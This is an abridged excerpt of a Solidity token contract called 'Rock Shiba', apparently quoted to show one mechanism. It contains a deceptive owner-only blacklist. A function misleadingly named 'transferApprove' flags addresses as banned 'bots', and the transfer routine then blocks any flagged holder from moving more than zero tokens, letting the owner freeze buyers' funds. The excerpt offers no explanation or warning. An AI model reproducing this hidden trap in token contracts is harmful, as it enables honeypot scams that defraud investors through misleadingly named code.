...
contract RockShiba is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _transferApprove;
    event botBanned (address transferAddress, bool isBanned);
    ...
    string private _name = 'Rock Shiba';
    string private _symbol = 'ROCKSHIB';
    ...
    function transferApprove(address transferAddress) external onlyOwner {
        if (_transferApprove[transferAddress] == true) {
            _transferApprove[transferAddress] = false;
        } else {_transferApprove[transferAddress] = true;
            emit botBanned (transferAddress, _transferApprove[transferAddress]);
          }
    }
    
    function checkTransfer(address transferAddress) public view returns (bool) {
        return _transferApprove[transferAddress];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_transferApprove[sender] || _transferApprove[recipient]) require (amount == 0, "");
